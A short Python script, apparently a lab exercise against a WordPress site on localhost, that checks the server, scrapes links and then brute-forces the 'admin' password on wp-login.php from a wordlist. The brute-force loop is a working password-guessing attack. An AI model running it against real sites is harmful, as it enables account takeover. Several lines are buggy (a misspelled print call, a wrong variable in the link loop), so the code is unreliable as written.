# Check if web portal is up by using GET request
import requests
requests.get("http://127.0.0.1")

# which server software is being used
req_ = requests.get("http://127.0.0.1")
req_.headers

# print response headers of the GET response
# get text content of localhost home page

req_.content
req_.text

# print response in pretty form using beautiful soup
from bs4 import BeautifulSoup
soup = BeautifulSoup(req_.text, 'html.parser')
print(soup.prettify())

# print the title of web portal hosted on localhost
prin(soup.title)

# scrape all urls from homepage of localhost and print unique urls
home_ = requests.get("http://localhost")
soup = BeautifulSoup(home_.text, 'html.parser')
imgs = soup.find_all("a",href=True)
imgs_href = []

for img in imgs:
	imgs_href.append(imgs['href'])

imgs_set = set(imgs_href)
for img in imgs_set:
	print(img)

# access the admin section 

word_p = requests.get("http://localhost/wp-admin")
soup_word_p = BeautifulSoup(word_p.text, 'html.parser')
print(soup_word_p.prettify())

# bruteforce the wordpress login for user "admin"
passfile = "password_dictionary.txt"

with open(passfile, "r") as f:
	for word in f:
		word = word.strip("\n")
		trying_ = requests.post("http://localhost/wp-login.php", data={"log":"admin", "pwd":word})

		if "ERROR" not in trying_.text:
			print("Success, the password is : "+word)
		else:
			print("Incorrect password "+word)